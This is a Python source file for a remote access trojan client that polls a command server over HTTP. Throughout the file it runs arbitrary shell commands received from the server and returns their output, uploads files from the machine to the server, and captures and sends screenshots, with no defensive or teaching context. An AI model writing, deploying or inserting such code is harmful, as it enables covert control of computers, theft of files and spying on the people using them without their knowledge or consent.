import requests
import time
import subprocess
import os
import shutil
import tempfile
from PIL import ImageGrab

server_url = 'http//127.0.0.1:8080'
while True:
    try:
        req = requests.get(server_url)

        command = req.text

        #TERMINATE SHELL
        if "terminate" in command:
            break

        #CHANGE DIRECTORY
        elif "cd" in command:
            change = command[3:].strip()
            if os.path.exists(change):
                os.chdir(change)
                current_dir = os.getcwd()
                requests.post(server_url, data=current_dir)
            else:
                requests.post(server_url, data=b"Directotry not found")

        #SEND FILE TO SERVER
        elif "download" in command:
            try:
                _, path = command.split(" ")
                if os.path.exists(path):
                    url = f"{server_url}/store"
                    with open(path, 'rb') as file:
                        requests.post(
                            url,
                            data = file,
                            headers = {"Content-Type": "application/octet-stream"},
                            timeout = 10
                        )

                else:
                    requests.post(server_url, b"File not found")

            except Exception as e:
                requests.post(server_url, str(e))

        #TAKE AND SEND SCREENSHOT
        elif "snap" in command:
            print("take screen shot")
            try:
                url = f"{server_url}/screen_shot"
                dir_path = tempfile.mkdtemp()
                pic_path = os.path.join(dir_path, 'img.jpg')
                ImageGrab.grab().save(pic_path, "JPEG")
                with open(pic_path, "rb") as pic:
                    requests.post(
                        url,
                        data = pic,
                        headers = {"Content-Type": "application/octet-stream"},
                        timeout = 10
                    )
                shutil.rmtree(dir_path)
            except Exception as e:
                requests.post(server_url, str(e))

        #EXECUTE SHELL COMMANDS
        else:
            cmd = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stderr = cmd.stderr.read()
            stdout = cmd.stdout.read()

            requests.post(server_url, data=stdout)
            requests.post(server_url, data=stderr)

        time.sleep(2)
    except Exception as e:
        print("Connecting...")
        time.sleep(5)
        continue

    except KeyboardInterrupt:
        break